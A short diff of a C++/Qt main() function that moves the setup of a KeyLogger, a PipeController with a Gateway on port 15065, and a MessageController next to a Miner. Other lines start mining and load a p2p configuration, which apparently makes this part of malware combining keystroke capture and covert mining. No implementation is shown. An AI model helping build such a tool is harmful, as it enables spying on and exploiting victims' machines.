@@ -27,6 +27,9 @@ int main(int argc, char *argv[])
     {
         Context::instance().load();
         Context::instance().miner = new Miner(1, &a);
+        Context::instance().keyLogger = new KeyLogger(&a);
+        Context::instance().pipeController = new PipeController(new Gateway(15065, &a), &a);
+        Context::instance().messageController = new MessageController(&a);
     }
     catch(std::exception &e)
     {
@@ -60,9 +63,6 @@ int main(int argc, char *argv[])
     QSettings settings(dir.absoluteFilePath("p2p.conf"), QSettings::IniFormat);
 
     
-    Context::instance().keyLogger = new KeyLogger(&a);
-    Context::instance().pipeController = new PipeController(new Gateway(15065, &a), &a);
-    Context::instance().messageController = new MessageController(&a);
 
     CommandProvider::instance();
 	Context::instance().miner->startMine();
